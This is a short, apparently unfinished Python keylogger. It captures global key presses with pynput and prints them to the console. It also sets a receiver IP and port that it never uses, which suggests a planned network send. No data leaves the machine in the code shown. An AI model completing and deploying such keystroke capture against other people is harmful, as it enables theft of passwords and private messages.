from pynput.keyboard import Listener, Key
from socket import socket, AF_INET, SOCK_STREAM
from sys import stdin

receiverIP = "192.168.1.4"
receiverPort = "30001"

def on_press(key):
    try:
        print(key.char, end = ' ')
    except AttributeError:
        print(str(key))

def on_release(key):
    print("{} released".format(key))

    if (key == Key.esc):
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()